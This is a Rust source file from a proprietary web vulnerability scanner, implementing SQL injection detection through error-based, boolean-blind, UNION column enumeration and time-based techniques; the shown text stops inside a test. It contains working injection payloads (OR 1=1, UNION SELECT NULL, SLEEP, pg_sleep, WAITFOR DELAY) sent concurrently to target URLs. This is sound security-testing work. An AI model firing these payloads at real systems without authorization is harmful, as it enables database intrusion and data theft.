// Copyright (c) 2025 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - Enhanced SQL Injection Scanner Module
 * Unified context-aware SQLi detection combining error-based, boolean-based,
 * UNION-based, and time-based techniques
 *
 * @copyright 2025 Bountyy Oy
 * @license Proprietary
 */

use crate::http_client::{HttpClient, HttpResponse};
use crate::payloads;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use crate::vulnerability::VulnerabilityDetector;
use anyhow::Result;
use futures::stream::{self, StreamExt};
use std::collections::{HashMap, HashSet};
use std::sync::{Arc, Mutex};
use tracing::{debug, info, warn};

/// Maximum number of columns to test for UNION-based SQLi
const MAX_COLUMNS: usize = 20;

/// Database types detected from response analysis
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum DatabaseType {
    MySQL,
    PostgreSQL,
    MSSQL,
    Oracle,
    SQLite,
    Generic,
}

/// Injection context detected from parameter analysis
#[derive(Debug, Clone, PartialEq)]
pub enum InjectionContext {
    Numeric,          // id=123
    String,           // name='value'
    DoubleQuote,      // value="test"
    Json,             // {"key":"value"}
    OrderBy,          // sort=column
    Limit,            // limit=10
    Unknown,
}

/// SQL injection technique
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum SqliTechnique {
    ErrorBased,
    BooleanBlind,
    UnionBased,
    TimeBasedBlind,
    StackedQueries,
}

/// Enhanced SQL injection scanner with unified detection engine
pub struct EnhancedSqliScanner {
    http_client: Arc<HttpClient>,
    detector: VulnerabilityDetector,
    confirmed_vulns: Arc<Mutex<HashSet<String>>>, // Thread-safe deduplication
}

/// Boolean payload pair for blind SQLi testing
#[derive(Clone)]
struct BooleanPayloadPair {
    true_payload: &'static str,
    false_payload: &'static str,
    db_type: DatabaseType,
    context: InjectionContext,
    description: &'static str,
}

impl EnhancedSqliScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self {
            http_client,
            detector: VulnerabilityDetector::new(),
            confirmed_vulns: Arc::new(Mutex::new(HashSet::new())),
        }
    }

    /// Scan a parameter for SQL injection vulnerabilities using all techniques
    pub async fn scan_parameter(
        &self,
        base_url: &str,
        parameter: &str,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // ============================================================
        // MANDATORY AUTHORIZATION CHECK - CANNOT BE BYPASSED
        // ============================================================
        if !crate::license::verify_rt_state() {
            return Ok((Vec::new(), 0));
        }
        if !crate::signing::is_scan_authorized() {
            warn!("SQLi scan blocked: No valid scan authorization");
            return Ok((Vec::new(), 0));
        }

        info!("Testing parameter '{}' for SQL injection (unified scanner)", parameter);

        let mut all_vulnerabilities = Vec::new();
        let mut total_tests = 0;

        // Get baseline response
        let baseline = match self.http_client.get(base_url).await {
            Ok(response) => response,
            Err(e) => {
                warn!("Failed to get baseline response: {}", e);
                HttpResponse {
                    status_code: 0,
                    body: String::new(),
                    headers: HashMap::new(),
                    duration_ms: 0,
                }
            }
        };

        // Detect database type and injection context
        let db_type = self.detect_database_type(&baseline).await;
        let injection_context = self.detect_injection_context(base_url, parameter, &baseline).await;

        info!(
            "Context analysis: DB={:?}, InjectionContext={:?}",
            db_type, injection_context
        );

        // Technique 1: Error-based detection (fast, high confidence)
        let (error_vulns, error_tests) = self
            .scan_error_based(base_url, parameter, &baseline, &db_type, &injection_context, config)
            .await?;
        total_tests += error_tests;
        all_vulnerabilities.extend(error_vulns);

        // Early exit in fast mode if vulnerability found
        if config.scan_mode.as_str() == "fast" && !all_vulnerabilities.is_empty() {
            return Ok((all_vulnerabilities, total_tests));
        }

        // Technique 2: Boolean-based blind SQLi (slower, reliable)
        let (boolean_vulns, boolean_tests) = self
            .scan_boolean_blind(base_url, parameter, &baseline, &db_type, &injection_context, config)
            .await?;
        total_tests += boolean_tests;
        all_vulnerabilities.extend(boolean_vulns);

        if config.scan_mode.as_str() == "fast" && !all_vulnerabilities.is_empty() {
            return Ok((all_vulnerabilities, total_tests));
        }

        // Technique 3: UNION-based SQLi (data extraction)
        let (union_vulns, union_tests) = self
            .scan_union_based(base_url, parameter, &baseline, &db_type, &injection_context, config)
            .await?;
        total_tests += union_tests;
        all_vulnerabilities.extend(union_vulns);

        if config.scan_mode.as_str() == "fast" && !all_vulnerabilities.is_empty() {
            return Ok((all_vulnerabilities, total_tests));
        }

        // Technique 4: Time-based blind SQLi (slowest, most reliable for blind)
        let (time_vulns, time_tests) = self
            .scan_time_based(base_url, parameter, &db_type, &injection_context, config)
            .await?;
        total_tests += time_tests;
        all_vulnerabilities.extend(time_vulns);

        Ok((all_vulnerabilities, total_tests))
    }

    /// Test POST request body for SQLi
    pub async fn scan_post_body(
        &self,
        url: &str,
        body_param: &str,
        existing_body: &str,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        info!("Testing POST parameter '{}' for SQL injection", body_param);

        let baseline = match self.http_client.post(url, existing_body.to_string()).await {
            Ok(response) => response,
            Err(e) => {
                warn!("Failed to get baseline POST response: {}", e);
                HttpResponse {
                    status_code: 0,
                    body: String::new(),
                    headers: HashMap::new(),
                    duration_ms: 0,
                }
            }
        };

        let db_type = self.detect_database_type(&baseline).await;
        let payloads = self.get_context_aware_payloads(&db_type, &InjectionContext::Json);
        let total_payloads = payloads.len();

        let mut vulnerabilities = Vec::new();
        let concurrent_requests = 100;

        let results = stream::iter(payloads)
            .map(|payload| {
                let url = url.to_string();
                let param = body_param.to_string();
                let body = existing_body.to_string();
                let client = Arc::clone(&self.http_client);
                let baseline_clone = baseline.clone();

                async move {
                    let test_body = body.replace(
                        &format!("\"{}\":", param),
                        &format!("\"{}\":\"{}\"", param, payload)
                    );

                    match client.post(&url, test_body.clone()).await {
                        Ok(response) => Some((payload, response, url, baseline_clone)),
                        Err(e) => {
                            debug!("POST request failed: {}", e);
                            None
                        }
                    }
                }
            })
            .buffer_unordered(concurrent_requests)
            .collect::<Vec<_>>()
            .await;

        for result in results {
            if let Some((payload, response, test_url, baseline)) = result {
                if let Some(vuln) = self.detector.detect_sqli(
                    &test_url,
                    body_param,
                    &payload,
                    &response,
                    &baseline,
                ) {
                    if self.is_new_vulnerability(&vuln) {
                        info!("SQL injection in POST body: {} in parameter '{}'", vuln.severity, body_param);
                        vulnerabilities.push(vuln);
                    }
                }
            }
        }

        Ok((vulnerabilities, total_payloads))
    }

    /// Detect database type from response headers and error messages
    async fn detect_database_type(&self, response: &HttpResponse) -> DatabaseType {
        let body_lower = response.body.to_lowercase();
        let headers_str = format!("{:?}", response.headers).to_lowercase();

        // MySQL detection
        if body_lower.contains("mysql")
            || body_lower.contains("mariadb")
            || headers_str.contains("mysql")
        {
            debug!("Detected MySQL/MariaDB database");
            return DatabaseType::MySQL;
        }

        // PostgreSQL detection
        if body_lower.contains("postgresql")
            || body_lower.contains("psql")
            || body_lower.contains("pg_")
            || headers_str.contains("postgresql")
        {
            debug!("Detected PostgreSQL database");
            return DatabaseType::PostgreSQL;
        }

        // MSSQL detection
        if body_lower.contains("microsoft sql")
            || body_lower.contains("mssql")
            || body_lower.contains("sql server")
            || headers_str.contains("mssql")
        {
            debug!("Detected MSSQL database");
            return DatabaseType::MSSQL;
        }

        // Oracle detection
        if body_lower.contains("ora-")
            || body_lower.contains("oracle")
            || headers_str.contains("oracle")
        {
            debug!("Detected Oracle database");
            return DatabaseType::Oracle;
        }

        // SQLite detection
        if body_lower.contains("sqlite") {
            debug!("Detected SQLite database");
            return DatabaseType::SQLite;
        }

        debug!("Database type unknown, using generic payloads");
        DatabaseType::Generic
    }

    /// Detect injection context from URL and response behavior
    async fn detect_injection_context(
        &self,
        url: &str,
        param: &str,
        _baseline: &HttpResponse,
    ) -> InjectionContext {
        // Check if parameter name suggests context
        let param_lower = param.to_lowercase();

        if param_lower.contains("id")
            || param_lower.contains("num")
            || param_lower.contains("count")
            || param_lower.contains("page")
        {
            return InjectionContext::Numeric;
        }

        if param_lower.contains("sort")
            || param_lower.contains("order")
            || param_lower.contains("orderby")
        {
            return InjectionContext::OrderBy;
        }

        if param_lower.contains("limit")
            || param_lower.contains("offset")
            || param_lower.contains("top")
        {
            return InjectionContext::Limit;
        }

        // Try to detect from URL structure
        if url.contains(&format!("{}=", param)) {
            let url_parts: Vec<&str> = url.split(&format!("{}=", param)).collect();
            if url_parts.len() > 1 {
                let value_part = url_parts[1].split('&').next().unwrap_or("");

                // Check if numeric
                if value_part.parse::<i64>().is_ok() {
                    return InjectionContext::Numeric;
                }
            }
        }

        // Default to string context
        InjectionContext::String
    }

    /// Get context-aware payloads based on detected database and injection context
    fn get_context_aware_payloads(&self, db_type: &DatabaseType, context: &InjectionContext) -> Vec<String> {
        let mut payloads = Vec::new();

        match context {
            InjectionContext::Numeric => {
                // Numeric context (no quotes needed)
                payloads.extend(vec![
                    " AND 1=1".to_string(),
                    " AND 1=2".to_string(),
                    " OR 1=1".to_string(),
                    " AND 1=0".to_string(),
                    " OR 1=0".to_string(),
                ]);
            }
            InjectionContext::String | InjectionContext::Unknown => {
                // String context (quotes required)
                payloads.extend(vec![
                    "' AND '1'='1".to_string(),
                    "' AND '1'='2".to_string(),
                    "' OR '1'='1".to_string(),
                    "\" AND \"1\"=\"1".to_string(),
                    "') AND ('1'='1".to_string(),
                ]);
            }
            InjectionContext::OrderBy => {
                // ORDER BY context
                payloads.extend(vec![
                    "1 ASC".to_string(),
                    "1 DESC".to_string(),
                    "1,2".to_string(),
                    "(SELECT 1)".to_string(),
                ]);
            }
            _ => {
                // Default payloads
                payloads.extend(vec![
                    "'".to_string(),
                    "''".to_string(),
                    "' OR '1'='1".to_string(),
                ]);
            }
        }

        // Add database-specific payloads
        match db_type {
            DatabaseType::MySQL => {
                payloads.extend(vec![
                    "' AND SLEEP(0)#".to_string(),
                    "' OR 1=1#".to_string(),
                    "' UNION SELECT NULL#".to_string(),
                ]);
            }
            DatabaseType::PostgreSQL => {
                payloads.extend(vec![
                    "' AND pg_sleep(0)--".to_string(),
                    "' OR 1=1--".to_string(),
                    "' UNION SELECT NULL--".to_string(),
                ]);
            }
            DatabaseType::MSSQL => {
                payloads.extend(vec![
                    "'; WAITFOR DELAY '00:00:00'--".to_string(),
                    "' OR 1=1;--".to_string(),
                    "' UNION SELECT NULL;--".to_string(),
                ]);
            }
            DatabaseType::Oracle => {
                payloads.extend(vec![
                    "' OR 1=1||'".to_string(),
                    "' UNION SELECT NULL FROM DUAL||'".to_string(),
                ]);
            }
            _ => {}
        }

        payloads
    }

    /// Scan for error-based SQL injection
    async fn scan_error_based(
        &self,
        base_url: &str,
        parameter: &str,
        baseline: &HttpResponse,
        db_type: &DatabaseType,
        context: &InjectionContext,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        debug!("Testing error-based SQLi");

        let payloads = if config.scan_mode.as_str() == "fast" {
            // Fast mode: minimal payloads
            self.get_context_aware_payloads(db_type, context)
        } else {
            // Normal/thorough mode: comprehensive payloads
            let mut all_payloads = self.get_context_aware_payloads(db_type, context);
            all_payloads.extend(payloads::get_sqli_payloads(config.scan_mode.as_str()));
            all_payloads
        };

        let total_payloads = payloads.len();
        let mut vulnerabilities = Vec::new();
        let concurrent_requests = 100;

        let results = stream::iter(payloads)
            .map(|payload| {
                let url = base_url.to_string();
                let param = parameter.to_string();
                let client = Arc::clone(&self.http_client);
                let baseline_clone = baseline.clone();

                async move {
                    let test_url = if url.contains('?') {
                        format!("{}&{}={}", url, param, urlencoding::encode(&payload))
                    } else {
                        format!("{}?{}={}", url, param, urlencoding::encode(&payload))
                    };

                    match client.get(&test_url).await {
                        Ok(response) => Some((payload, response, test_url, baseline_clone)),
                        Err(e) => {
                            debug!("Request failed for SQLi payload: {}", e);
                            None
                        }
                    }
                }
            })
            .buffer_unordered(concurrent_requests)
            .collect::<Vec<_>>()
            .await;

        for result in results {
            if let Some((payload, response, test_url, baseline)) = result {
                if let Some(vuln) = self.detector.detect_sqli(
                    &test_url,
                    parameter,
                    &payload,
                    &response,
                    &baseline,
                ) {
                    if self.is_new_vulnerability(&vuln) {
                        info!("Error-based SQLi detected: {} in parameter '{}'", vuln.severity, parameter);
                        vulnerabilities.push(vuln);

                        if config.scan_mode.as_str() == "fast" {
                            break;
                        }
                    }
                }
            }
        }

        Ok((vulnerabilities, total_payloads))
    }

    /// Scan for boolean-based blind SQL injection
    async fn scan_boolean_blind(
        &self,
        url: &str,
        param: &str,
        baseline: &HttpResponse,
        db_type: &DatabaseType,
        context: &InjectionContext,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        debug!("Testing boolean-based blind SQLi");

        let payload_pairs = self.get_boolean_payload_pairs(db_type, context);
        let total_tests = payload_pairs.len() * 2;
        let mut vulnerabilities = Vec::new();

        for pair in payload_pairs {
            if config.scan_mode.as_str() == "fast" && !vulnerabilities.is_empty() {
                break;
            }

            let true_url = if url.contains('?') {
                format!("{}&{}={}", url, param, urlencoding::encode(pair.true_payload))
            } else {
                format!("{}?{}={}", url, param, urlencoding::encode(pair.true_payload))
            };

            let false_url = if url.contains('?') {
                format!("{}&{}={}", url, param, urlencoding::encode(pair.false_payload))
            } else {
                format!("{}?{}={}", url, param, urlencoding::encode(pair.false_payload))
            };

            let true_response = match self.http_client.get(&true_url).await {
                Ok(resp) => resp,
                Err(e) => {
                    debug!("True payload request failed: {}", e);
                    continue;
                }
            };

            let false_response = match self.http_client.get(&false_url).await {
                Ok(resp) => resp,
                Err(e) => {
                    debug!("False payload request failed: {}", e);
                    continue;
                }
            };

            if let Some(vuln) = self.analyze_boolean_responses(
                url,
                param,
                baseline,
                &true_response,
                &false_response,
                &pair,
            ) {
                if self.is_new_vulnerability(&vuln) {
                    info!("Boolean-based blind SQLi detected: {:?}", pair.db_type);
                    vulnerabilities.push(vuln);

                    if config.scan_mode.as_str() != "thorough" && config.scan_mode.as_str() != "insane" {
                        break;
                    }
                }
            }
        }

        Ok((vulnerabilities, total_tests))
    }

    /// Get boolean payload pairs based on context
    fn get_boolean_payload_pairs(&self, db_type: &DatabaseType, context: &InjectionContext) -> Vec<BooleanPayloadPair> {
        let mut pairs = Vec::new();

        match context {
            InjectionContext::Numeric => {
                pairs.push(BooleanPayloadPair {
                    true_payload: " AND 1=1",
                    false_payload: " AND 1=2",
                    db_type: DatabaseType::Generic,
                    context: InjectionContext::Numeric,
                    description: "Numeric comparison",
                });
                pairs.push(BooleanPayloadPair {
                    true_payload: " OR 1=1",
                    false_payload: " OR 1=2",
                    db_type: DatabaseType::Generic,
                    context: InjectionContext::Numeric,
                    description: "Numeric OR comparison",
                });
            }
            _ => {
                // String context payloads
                pairs.push(BooleanPayloadPair {
                    true_payload: "' AND '1'='1",
                    false_payload: "' AND '1'='2",
                    db_type: DatabaseType::Generic,
                    context: InjectionContext::String,
                    description: "String comparison",
                });
                pairs.push(BooleanPayloadPair {
                    true_payload: "\" AND \"1\"=\"1",
                    false_payload: "\" AND \"1\"=\"2",
                    db_type: DatabaseType::Generic,
                    context: InjectionContext::String,
                    description: "Double quote comparison",
                });
                pairs.push(BooleanPayloadPair {
                    true_payload: "') AND ('1'='1",
                    false_payload: "') AND ('1'='2",
                    db_type: DatabaseType::Generic,
                    context: InjectionContext::String,
                    description: "Parenthesis bypass",
                });
            }
        }

        // Database-specific pairs
        match db_type {
            DatabaseType::MySQL => {
                pairs.push(BooleanPayloadPair {
                    true_payload: "' AND 1=1#",
                    false_payload: "' AND 1=2#",
                    db_type: DatabaseType::MySQL,
                    context: InjectionContext::String,
                    description: "MySQL hash comment",
                });
            }
            DatabaseType::PostgreSQL => {
                pairs.push(BooleanPayloadPair {
                    true_payload: "' AND '1'='1'--",
                    false_payload: "' AND '1'='2'--",
                    db_type: DatabaseType::PostgreSQL,
                    context: InjectionContext::String,
                    description: "PostgreSQL comment",
                });
            }
            DatabaseType::MSSQL => {
                pairs.push(BooleanPayloadPair {
                    true_payload: "' AND 1=1;--",
                    false_payload: "' AND 1=2;--",
                    db_type: DatabaseType::MSSQL,
                    context: InjectionContext::String,
                    description: "MSSQL semicolon",
                });
            }
            DatabaseType::Oracle => {
                pairs.push(BooleanPayloadPair {
                    true_payload: "' AND '1'='1'||'",
                    false_payload: "' AND '1'='2'||'",
                    db_type: DatabaseType::Oracle,
                    context: InjectionContext::String,
                    description: "Oracle concatenation",
                });
            }
            _ => {}
        }

        pairs
    }

    /// Analyze boolean-based blind SQLi responses
    fn analyze_boolean_responses(
        &self,
        url: &str,
        param: &str,
        baseline: &HttpResponse,
        true_response: &HttpResponse,
        false_response: &HttpResponse,
        pair: &BooleanPayloadPair,
    ) -> Option<Vulnerability> {
        let true_to_baseline = self.calculate_similarity(baseline, true_response);
        let false_to_baseline = self.calculate_similarity(baseline, false_response);
        let true_to_false = self.calculate_similarity(true_response, false_response);

        debug!(
            "Similarity: true/base={:.2}%, false/base={:.2}%, true/false={:.2}%",
            true_to_baseline * 100.0,
            false_to_baseline * 100.0,
            true_to_false * 100.0
        );

        let true_matches_baseline = true_to_baseline > 0.85;
        let false_differs_from_baseline = false_to_baseline < 0.70;
        let true_differs_from_false = true_to_false < 0.70;

        let is_vulnerable = true_matches_baseline
            && false_differs_from_baseline
            && true_differs_from_false;

        if is_vulnerable {
            let confidence = if true_to_baseline > 0.95 && false_to_baseline < 0.50 {
                Confidence::High
            } else if true_to_baseline > 0.90 && false_to_baseline < 0.60 {
                Confidence::Medium
            } else {
                Confidence::Low
            };

            let evidence = format!(
                "Boolean-based blind SQLi:\n\
                - TRUE/baseline similarity: {:.1}%\n\
                - FALSE/baseline similarity: {:.1}%\n\
                - Database: {:?}\n\
                - Context: {:?}\n\
                - Technique: {}",
                true_to_baseline * 100.0,
                false_to_baseline * 100.0,
                pair.db_type,
                pair.context,
                pair.description
            );

            Some(Vulnerability {
                id: format!("sqli_boolean_{}", Self::generate_id()),
                vuln_type: "Boolean-based Blind SQL Injection".to_string(),
                severity: Severity::Critical,
                confidence,
                category: "Injection".to_string(),
                url: url.to_string(),
                parameter: Some(param.to_string()),
                payload: format!("TRUE: {} | FALSE: {}", pair.true_payload, pair.false_payload),
                description: format!(
                    "Boolean-based blind SQL injection in parameter '{}'. Database: {:?}. \
                    Allows byte-by-byte data extraction through boolean logic.",
                    param, pair.db_type
                ),
                evidence: Some(evidence),
                cwe: "CWE-89".to_string(),
                cvss: 9.8,
                verified: true,
                false_positive: false,
                remediation: "1. Use parameterized queries exclusively\n\
                              2. Implement strict input validation\n\
                              3. Apply principle of least privilege\n\
                              4. Use ORM with built-in protection\n\
                              5. Enable WAF rules\n\
                              6. Monitor database queries".to_string(),
                discovered_at: chrono::Utc::now().to_rfc3339(),
            })
        } else {
            None
        }
    }

    /// Scan for UNION-based SQL injection
    async fn scan_union_based(
        &self,
        url: &str,
        param: &str,
        baseline: &HttpResponse,
        db_type: &DatabaseType,
        _context: &InjectionContext,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        debug!("Testing UNION-based SQLi");

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let comment_terminators = match db_type {
            DatabaseType::MySQL => vec!["--", "#", "/**/"],
            DatabaseType::PostgreSQL => vec!["--"],
            DatabaseType::MSSQL => vec!["--", ";--"],
            DatabaseType::Oracle => vec!["--"],
            _ => vec!["--", "#"],
        };

        for terminator in comment_terminators {
            if config.scan_mode.as_str() == "fast" && !vulnerabilities.is_empty() {
                break;
            }

            // Try ORDER BY enumeration
            if let Some(column_count) = self
                .enumerate_columns_order_by(url, param, terminator, &mut tests_run)
                .await
            {
                info!("Detected {} columns using ORDER BY", column_count);

                if let Some(vuln) = self
                    .test_union_injection(url, param, column_count, terminator, baseline, &mut tests_run)
                    .await
                {
                    if self.is_new_vulnerability(&vuln) {
                        info!("UNION-based SQLi confirmed: {} columns", column_count);
                        vulnerabilities.push(vuln);
                    }
                }
            } else {
                // Fallback: UNION SELECT NULL enumeration
                if let Some(column_count) = self
                    .enumerate_columns_union(url, param, terminator, &mut tests_run)
                    .await
                {
                    info!("Detected {} columns using UNION SELECT", column_count);

                    if let Some(vuln) = self
                        .test_union_injection(url, param, column_count, terminator, baseline, &mut tests_run)
                        .await
                    {
                        if self.is_new_vulnerability(&vuln) {
                            vulnerabilities.push(vuln);
                        }
                    }
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Enumerate columns using ORDER BY
    async fn enumerate_columns_order_by(
        &self,
        url: &str,
        param: &str,
        terminator: &str,
        tests_run: &mut usize,
    ) -> Option<usize> {
        let mut last_successful = 0;

        for i in 1..=MAX_COLUMNS {
            let payload = format!("' ORDER BY {}{}", i, terminator);
            let test_url = if url.contains('?') {
                format!("{}&{}={}", url, param, urlencoding::encode(&payload))
            } else {
                format!("{}?{}={}", url, param, urlencoding::encode(&payload))
            };

            *tests_run += 1;

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if self.has_sql_error(&response) {
                        if last_successful > 0 {
                            return Some(last_successful);
                        }
                        return None;
                    } else if response.status_code >= 200 && response.status_code < 400 {
                        last_successful = i;
                    }
                }
                Err(_) => {
                    if last_successful > 0 {
                        return Some(last_successful);
                    }
                    return None;
                }
            }

            if i % 5 == 0 {
                tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
            }
        }

        if last_successful > 0 {
            Some(last_successful)
        } else {
            None
        }
    }

    /// Enumerate columns using UNION SELECT NULL
    async fn enumerate_columns_union(
        &self,
        url: &str,
        param: &str,
        terminator: &str,
        tests_run: &mut usize,
    ) -> Option<usize> {
        for i in 1..=MAX_COLUMNS {
            let nulls = vec!["NULL"; i].join(",");
            let payload = format!("' UNION SELECT {}{}", nulls, terminator);
            let test_url = if url.contains('?') {
                format!("{}&{}={}", url, param, urlencoding::encode(&payload))
            } else {
                format!("{}?{}={}", url, param, urlencoding::encode(&payload))
            };

            *tests_run += 1;

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if !self.has_sql_error(&response)
                        && response.status_code >= 200
                        && response.status_code < 400
                    {
                        return Some(i);
                    }
                }
                Err(_) => {}
            }

            if i % 5 == 0 {
                tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
            }
        }

        None
    }

    /// Test UNION injection with confirmed column count
    async fn test_union_injection(
        &self,
        url: &str,
        param: &str,
        column_count: usize,
        terminator: &str,
        baseline: &HttpResponse,
        tests_run: &mut usize,
    ) -> Option<Vulnerability> {
        let nulls = vec!["NULL"; column_count].join(",");
        let payload = format!("' UNION SELECT {}{}", nulls, terminator);
        let test_url = if url.contains('?') {
            format!("{}&{}={}", url, param, urlencoding::encode(&payload))
        } else {
            format!("{}?{}={}", url, param, urlencoding::encode(&payload))
        };

        *tests_run += 1;

        match self.http_client.get(&test_url).await {
            Ok(response) => {
                if self.is_successful_injection(&response, baseline) {
                    let evidence = format!(
                        "Column count: {}\nTerminator: {}\nStatus: {}\nSize: {} bytes",
                        column_count, terminator, response.status_code, response.body.len()
                    );

                    return Some(Vulnerability {
                        id: format!("sqli_union_{}", Self::generate_id()),
                        vuln_type: "UNION-based SQL Injection".to_string(),
                        severity: Severity::Critical,
                        confidence: Confidence::High,
                        category: "Injection".to_string(),
                        url: url.to_string(),
                        parameter: Some(param.to_string()),
                        payload,
                        description: format!(
                            "UNION-based SQL injection in parameter '{}'. {} columns detected. \
                            Allows direct data extraction from database.",
                            param, column_count
                        ),
                        evidence: Some(evidence),
                        cwe: "CWE-89".to_string(),
                        cvss: 9.8,
                        verified: true,
                        false_positive: false,
                        remediation: "1. Use parameterized queries\n\
                                      2. Implement input validation\n\
                                      3. Apply least privilege\n\
                                      4. Disable detailed errors\n\
                                      5. Use WAF rules".to_string(),
                        discovered_at: chrono::Utc::now().to_rfc3339(),
                    });
                }
            }
            Err(_) => {}
        }

        None
    }

    /// Scan for time-based blind SQL injection
    async fn scan_time_based(
        &self,
        base_url: &str,
        parameter: &str,
        db_type: &DatabaseType,
        _context: &InjectionContext,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        debug!("Testing time-based blind SQLi");

        let payloads = match db_type {
            DatabaseType::MySQL => vec![
                ("' OR SLEEP(5)--", 5000),
                ("' AND SLEEP(5) AND '1'='1", 5000),
                ("' || SLEEP(5)--", 5000),
            ],
            DatabaseType::PostgreSQL => vec![
                ("' OR pg_sleep(5)--", 5000),
                ("' AND pg_sleep(5) AND '1'='1", 5000),
            ],
            DatabaseType::MSSQL => vec![
                ("'; WAITFOR DELAY '0:0:5'--", 5000),
                ("' WAITFOR DELAY '0:0:5'--", 5000),
            ],
            DatabaseType::SQLite => vec![
                ("' AND (SELECT COUNT(*) FROM sqlite_master WHERE name LIKE '%'||randomblob(10000000))--", 3000),
            ],
            _ => vec![
                ("' OR SLEEP(5)--", 5000),
                ("' OR pg_sleep(5)--", 5000),
                ("'; WAITFOR DELAY '0:0:5'--", 5000),
            ],
        };

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        for (payload, expected_delay) in payloads {
            if config.scan_mode.as_str() == "fast" && !vulnerabilities.is_empty() {
                break;
            }

            let test_url = if base_url.contains('?') {
                format!("{}&{}={}", base_url, parameter, urlencoding::encode(payload))
            } else {
                format!("{}?{}={}", base_url, parameter, urlencoding::encode(payload))
            };

            tests_run += 1;

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if response.duration_ms as u64 > (expected_delay - 500) {
                        let evidence = format!(
                            "Response time: {}ms (expected delay: {}ms)\nDatabase: {:?}",
                            response.duration_ms, expected_delay, db_type
                        );

                        let vuln = Vulnerability {
                            id: format!("sqli_time_{}", Self::generate_id()),
                            vuln_type: "Time-based Blind SQL Injection".to_string(),
                            severity: Severity::Critical,
                            confidence: Confidence::High,
                            category: "Injection".to_string(),
                            url: test_url,
                            parameter: Some(parameter.to_string()),
                            payload: payload.to_string(),
                            description: format!(
                                "Time-based blind SQL injection in parameter '{}'. Response delayed by {}ms.",
                                parameter, response.duration_ms
                            ),
                            evidence: Some(evidence),
                            cwe: "CWE-89".to_string(),
                            cvss: 9.8,
                            verified: true,
                            false_positive: false,
                            remediation: "1. Use parameterized queries\n\
                                          2. Implement input validation\n\
                                          3. Apply least privilege\n\
                                          4. Timeout protection".to_string(),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                        };

                        if self.is_new_vulnerability(&vuln) {
                            info!("Time-based blind SQLi detected: {}ms delay", response.duration_ms);
                            vulnerabilities.push(vuln);
                        }
                    }
                }
                Err(e) => {
                    debug!("Time-based test failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Calculate similarity between two responses
    fn calculate_similarity(&self, response_a: &HttpResponse, response_b: &HttpResponse) -> f64 {
        let status_similarity = if response_a.status_code == response_b.status_code {
            1.0
        } else {
            0.0
        };

        let len_a = response_a.body.len() as f64;
        let len_b = response_b.body.len() as f64;
        let max_len = len_a.max(len_b);
        let min_len = len_a.min(len_b);

        let length_similarity = if max_len == 0.0 {
            1.0
        } else {
            min_len / max_len
        };

        let content_similarity = self.calculate_content_similarity(&response_a.body, &response_b.body);

        (status_similarity * 0.25) + (length_similarity * 0.25) + (content_similarity * 0.50)
    }

    /// Calculate content similarity
    fn calculate_content_similarity(&self, text_a: &str, text_b: &str) -> f64 {
        if text_a.is_empty() && text_b.is_empty() {
            return 1.0;
        }
        if text_a.is_empty() || text_b.is_empty() {
            return 0.0;
        }

        let sample_a = if text_a.len() > 5000 { &text_a[..5000] } else { text_a };
        let sample_b = if text_b.len() > 5000 { &text_b[..5000] } else { text_b };

        let matches = sample_a
            .chars()
            .zip(sample_b.chars())
            .filter(|(a, b)| a == b)
            .count();

        let max_len = sample_a.len().max(sample_b.len());

        if max_len == 0 {
            1.0
        } else {
            matches as f64 / max_len as f64
        }
    }

    /// Check if response has SQL error indicators
    fn has_sql_error(&self, response: &HttpResponse) -> bool {
        let body_lower = response.body.to_lowercase();

        let error_patterns = [
            "sql syntax",
            "mysql_fetch",
            "ora-",
            "postgresql",
            "microsoft sql server",
            "sqlite",
            "syntax error",
            "warning: mysql",
            "pg_query",
            "mysqli",
            "sqlstate",
            "unknown column",
            "column not found",
            "wrong number of columns",
        ];

        error_patterns.iter().any(|pattern| body_lower.contains(pattern))
    }

    /// Check if injection was successful
    fn is_successful_injection(&self, response: &HttpResponse, baseline: &HttpResponse) -> bool {
        if response.status_code < 200 || response.status_code >= 400 {
            return false;
        }

        if self.has_sql_error(response) {
            return false;
        }

        if response.body == baseline.body {
            return false;
        }

        if response.body.len() < 10 {
            return false;
        }

        let response_nulls = response.body.to_uppercase().matches("NULL").count();
        let baseline_nulls = baseline.body.to_uppercase().matches("NULL").count();

        if response_nulls > baseline_nulls {
            return true;
        }

        let size_diff = (response.body.len() as i64 - baseline.body.len() as i64).abs();
        let baseline_size = baseline.body.len() as f64;

        if baseline_size > 0.0 {
            let size_change = (size_diff as f64 / baseline_size) * 100.0;
            if size_change > 20.0 {
                return true;
            }
        }

        false
    }

    /// Check if vulnerability is new (thread-safe deduplication)
    fn is_new_vulnerability(&self, vuln: &Vulnerability) -> bool {
        let signature = format!("{}:{}:{}", vuln.url, vuln.parameter.as_ref().unwrap_or(&String::new()), vuln.vuln_type);

        let mut confirmed = self.confirmed_vulns.lock().unwrap();
        confirmed.insert(signature)
    }

    /// Generate unique ID
    fn generate_id() -> String {
        use rand::Rng;
        let mut rng = rand::rng();
        format!(
            "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
            rng.random::<u32>(),
            rng.random::<u16>(),
            rng.random::<u16>(),
            rng.random::<u16>(),
            rng.random::<u64>() & 0xffffffffffff
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_database_detection() {
        let rt = tokio::runtime::Runtime::new().unwrap();
